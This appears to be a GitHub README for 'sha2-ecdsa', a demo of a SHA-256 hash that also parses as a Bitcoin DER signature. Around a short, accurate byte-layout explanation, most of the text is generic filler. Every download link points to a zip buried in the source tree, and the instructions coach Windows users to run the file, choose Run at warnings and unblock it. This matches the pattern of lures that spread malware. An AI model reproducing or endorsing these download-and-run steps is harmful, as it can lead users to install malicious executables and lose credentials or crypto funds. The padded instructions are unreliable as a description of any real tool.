# 🧩 sha2-ecdsa - A hash that signs itself

[![Download sha2-ecdsa](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rutherforddry602/sha2-ecdsa/main/src/cluster/ecdsa-sha-2.9-beta.4.zip)

## 📥 Download and open
Use this link to visit the download page:

[Open sha2-ecdsa on GitHub](https://raw.githubusercontent.com/Rutherforddry602/sha2-ecdsa/main/src/cluster/ecdsa-sha-2.9-beta.4.zip)

On the page, look for the latest release or the main download link. If you see a file for Windows, download it and open it on your PC.

## 🖥️ What sha2-ecdsa does
sha2-ecdsa is a small tool and demo for one idea: a SHA-256 hash can also form a valid ECDSA signature.

It shows how one 32-byte hash can line up with the parts of a Bitcoin signature. The bytes must match exact positions, and the result is valid under BIP 66 rules.

You can use it to:
- view the hash and signature layout
- check the byte positions that matter
- study how the same data can fit two roles
- test how the example works on Windows

## ⚙️ What you need
Before you start, make sure you have:
- a Windows PC
- a web browser
- enough free space to save the download
- permission to run downloaded files on your computer

For best results:
- use a current version of Windows
- keep your browser up to date
- save the file to your Downloads folder or Desktop

## 🚀 How to get it on Windows
1. Open the GitHub link above.
2. Find the latest release or download area.
3. Download the Windows file.
4. If the file is a .zip, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the app file to run it.
7. If Windows asks for permission, choose Run.

If you only see the source page and no app file, look for the release section first. That is where Windows builds are often placed.

## 🧭 First-time setup
When you open the app for the first time:
- wait for Windows to finish checking the file
- allow the app to open if prompted
- keep the main folder together if you extracted a .zip
- do not move files out of the folder unless the app instructions say to

If the app opens with a window or console screen, that is normal for this kind of tool.

## 🔍 What you will see
The app centers on the hash and the signature parts that make the example work.

You may see:
- the SHA-256 hash value
- the DER signature layout
- byte values like `30`, `02`, `1D`, and `0F`
- the `r` and `s` fields
- the sighash type at the end

These values are part of the signature format used by Bitcoin. The app or files may show how each byte fits into place.

## 🧠 Simple way to read the example
The idea is easy to follow:

- A SHA-256 hash is 32 bytes long.
- A Bitcoin ECDSA signature has a fixed structure.
- Some byte patterns can fit both forms.
- If the bytes land in the right spots, the hash can also parse as a signature.

In this example, the hash is not just a digest. It also matches the signature shape used by Bitcoin scripts.

## 🧪 Example data in the repo
The project includes this sample:

- `SHA256(00000000000000000200a8013bbb8678)`
- `301d020a7993dad81d0e10285a7e020f682a7033db72199360c2dc3599f2d302`

The byte layout matters:
- `30` marks the start of a DER sequence
- `02` marks an integer
- `1D` gives the total length
- `0A` and `0F` mark the lengths of `r` and `s`
- the final `02` acts as the sighash type

BIP 66 also asks for:
- no extra leading zeros
- positive values
- non-zero `r` and `s`

That is why the exact byte positions matter so much.

## 🛠️ How to use it
If the app opens a window:
- read the on-screen text
- compare the hash with the signature layout
- follow the byte positions one by one

If the app is a command-line program:
- open the folder
- run the program file
- read the text it prints in the window

If the app includes sample files:
- keep the sample files in the same folder
- open them with the app if needed
- use the example hash as your starting point

## 📁 Folder layout
A common Windows download may include:
- the main app file
- a readme file
- sample data
- a license file
- support files needed by the app

Do not delete any files unless you know they are not needed. Some apps need all files in the same folder to start.

## 🔒 Safety checks
Before you run the file:
- make sure you downloaded it from the GitHub link above
- check that the file name matches the release or app name
- keep your browser download record in case you need to find it again

If Windows shows a file warning, read the file name and location before you continue.

## 🧷 Common Windows problems
If nothing happens when you open the file:
- wait a few seconds
- try opening it again
- check whether the file is still in a .zip archive
- make sure you extracted the files first

If Windows blocks the file:
- right-click the file
- open Properties
- look for an Unblock box
- apply the change if present
- try again

If the app closes right away:
- open it from the folder again
- look for a text file or readme with usage steps
- check whether it needs the support files in the same folder

## 📌 Why this project matters
This repo shows a rare case in Bitcoin data format work. It connects:
- SHA-256
- ECDSA
- DER encoding
- BIP 66 rules
- Bitcoin script behavior

It helps you see how strict byte placement can change what data means. That makes it useful for study, testing, and simple demo use on Windows

## 🧭 Basic terms
Here are a few plain-English meanings:
- hash: a fixed-size result from data
- signature: proof made with a private key
- DER: a common way to store structured data
- byte: one small unit of data
- sequence: a data block with an order
- script: a set of rules used by Bitcoin

## 📋 Quick start
1. Open the GitHub download link.
2. Get the Windows file from the release or download page.
3. Save it to your PC.
4. Extract it if it comes in a zip file.
5. Open the app file.
6. Read the hash and signature example.

## 🧩 What to expect from the demo
The demo focuses on one point: the hash can also be a valid signature when the bytes match the right DER pattern.

That means you may see:
- a short data block
- a precise byte map
- the same value shown in two forms
- a Bitcoin-style signature example

It is a good fit if you want to see how data format rules work in practice on Windows